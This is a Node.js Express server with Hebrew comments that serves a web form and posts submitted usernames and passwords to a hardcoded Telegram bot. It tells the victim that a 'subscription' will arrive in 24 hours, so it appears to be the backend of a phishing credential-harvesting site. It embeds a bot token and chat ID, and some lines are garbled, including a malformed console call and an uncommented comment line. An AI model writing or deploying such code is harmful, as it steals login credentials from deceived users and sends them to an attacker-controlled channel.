const express = require('express');
const path = require('path');

// יצירת מופע שרת ה-Express
const app = express();

// הגדרת מתווכים (Middlewares) לפענוח נתונים מהטופס ולניהול תיקיית האתר
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// הגדרות קבועות לבוט של טלגרם
const TELEGRAM_BOT_TOKEN = '8712536099:AAGnazkihREbhPJsGpgmAXOClVF3LSFneGg';
const TELEGRAM_CHAT_ID = '7519574690';

// מידלוור (Middleware) לרישום כל בקשה שמגיעה לשרת לצורך מעקב מלא
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] 📥 בקשה חדשה התקבלה: ${req.method} ${req.url}`);
    next();
});

// נתיב ראשי להגשת עמוד ה-HTML
app.get('/', (req, res) => {
    console.log('📄 מגיש את קובץ ה-index.html למשתמש.');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// נתיב קליטת הנתונים מהטופס ושליחתם המאובטחת לטלגרם
app.post('/send-email', async (req, res) => {
    console.----log?.() || console.log('----------------------------------------');
    console.log('🚀 התקבלה פנייה חדשה בנתיב /send-email');
    console.log('📦 גוף הבקשה הגולמי שהתקבל:', req.body);

חלץ והגן על הנתונים שהוזנו
    const username = req.body.username ? req.body.username.trim() : '';
    const password = req.body.password ? req.body.password.trim() : '';
    const subscription = req.body.subscription ? req.body.subscription.trim() : 'לא צויין';

    // בדיקת תקינות בסיסית
    if (!username || !password) {
        console.warn('⚠️ אזהרה: שם משתמש או סיסמה ריקים!');
        return res.status(400).send('שגיאה: חובה להזין שם משתמש וסיסמה.');
    }

    // בניית הודעה מעוצבת ומפורטת לטלגרם
    const telegramMessage = 
`🔐 *התקבלה בקשת מנוי חדשה מהאתר!*

⭐ *סוג מנוי:* ${subscription}
👤 *שם משתמש:* \`${username}\`
🔑 *סיסמה:* \`${password}\`
⏱️ *זמן שליחה:* ${new Date().toLocaleString('he-IL')}`;

    try {
        console.log('📤 מתחיל תהליך שליחה ל-API של טלגרם...');

        // יצירת מגבלת זמן (Timeout) של 10 שניות לבקשה לטלגרם למניעת תקיעה
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);

        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'Markdown'
            }),
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        const responseData = await telegramResponse.json();
        console.log('📥 תשובה התקבלה משרת טלגרם:', JSON.stringify(responseData));

        if (telegramResponse.ok && responseData.ok) {
            console.log('✅ ההודעה נשלחה בהצלחה לטלגרם!');
            return res.status(200).send('המנוי יתקבל בעוד 24 שעות');
        } else {
            console.error('❌ שגיאה מצד שרת טלגרם:', responseData);
            return res.status(500).send('שגיאה בשליחת הנתונים לטלגרם.');
        }

    } catch (error) {
        if (error.name === 'AbortError') {
            console.error('⌛ שגיאה: בקשת ה-Fetch לטלגרם ביצעה Timeout (חלף הזמן המוקצב).');
        } else {
            console.error('🔥 שגיאת תקשורת קריטית בעת הפנייה לטלגרם:', error);
        }
        return res.status(500).send('שגיאת תקשורת פנימית בשרת.');
    }
});

// תפיסת שגיאות גלובלית לכל השרת למניעת נפילות פתאומיות
app.use((err, req, res, next) => {
    console.error('💥 שגיאה לא מטופלת בשרת:', err.stack);
    res.status(500).send('שגיאת שרת פנימית בלתי צפויה.');
});

// הפעלת השרת על הפורט הנדרש
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('----------------------------------------');
    console.log(`מערכת השרת המלאה פועלת בהצלחה בפורט ${PORT}`);
    console.log('----------------------------------------');
});
